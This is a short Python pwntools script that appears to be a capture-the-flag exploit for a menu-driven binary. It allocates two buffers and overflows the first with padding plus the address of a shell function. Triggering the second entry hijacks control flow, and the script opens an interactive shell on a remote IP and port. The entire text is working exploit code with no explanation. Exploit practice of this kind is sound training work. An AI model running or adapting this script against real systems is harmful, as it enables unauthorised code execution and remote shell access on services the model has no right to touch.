from pwn import *

sh = 0x4014a0


def fun_add(r):
    r.recvuntil('size: ')
    r.sendline('4')
    r.recvuntil('content: ')
    r.sendline('AAAA')


def fun_edit(r):
    r.recvuntil('Index: ')
    r.sendline('0')
    p = b'A' * 32 + p64(sh)
    r.sendline(p)


# r = process('./ez')
r = remote('103.185.38.238', 15733)

r.recvuntil('Choice: ')
r.sendline('1')
fun_add(r)
r.recvuntil('Choice: ')
r.sendline('1')
fun_add(r)
r.recvuntil('Choice: ')
r.sendline('2')
fun_edit(r)
r.recvuntil('Choice: ')
r.sendline('3')
r.recvuntil('Index: ')
r.sendline('1')

r.interactive()